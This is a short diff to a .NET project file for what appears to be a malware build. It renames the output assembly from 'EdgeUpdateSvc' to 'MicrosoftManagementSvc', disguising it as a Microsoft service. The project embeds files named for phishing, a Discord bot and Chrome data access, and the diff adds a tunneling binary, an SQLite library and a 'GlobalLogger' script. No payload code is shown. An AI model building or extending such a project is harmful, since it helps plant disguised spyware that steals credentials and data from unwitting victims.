@@ -22,7 +22,7 @@
     <DebugSymbols>false</DebugSymbols>
     <Deterministic>false</Deterministic>
     <InvariantGlobalization>true</InvariantGlobalization>
-    <AssemblyName>EdgeUpdateSvc</AssemblyName>
+    <AssemblyName>MicrosoftManagementSvc</AssemblyName>
     <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
     
     <!-- WinForms dependency completely removed for NativeAOT support -->
@@ -40,6 +40,9 @@
     <EmbeddedResource Include="chromelevator.bin" />
     <EmbeddedResource Include="core\wechat_phish.py" />
     <EmbeddedResource Include="websocket\discord_bot.py" />
+    <EmbeddedResource Include="tools\bore.bin" />
+    <EmbeddedResource Include="e_sqlite3.dll" />
+    <EmbeddedResource Include="GlobalLogger.py" />
   </ItemGroup>
   
   <ItemGroup>
